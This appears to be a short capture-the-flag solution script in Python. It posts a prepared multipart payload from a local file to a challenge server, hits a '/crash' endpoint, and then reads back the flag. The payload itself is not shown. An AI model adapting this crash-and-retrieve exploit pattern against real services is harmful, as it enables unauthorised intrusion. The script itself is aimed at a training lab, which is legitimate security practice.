from requests import get, post
from time import sleep
URL = 'http://challenges.wsi.edu.pl:'


def get_flag(port: int):
    with open('data', 'rb') as file:
        data = file.read()
        post(f'{URL}{port}',
             headers={'Content-Type': 'multipart/form-data; boundary=---------------------------974767299852498929531610575'},
             data=data)
    try: get(f'{URL}{port}/crash')
    except Exception: sleep(2)
    return get(f'{URL}{port}').json()


if __name__ == '__main__':
    print(get_flag(6119))
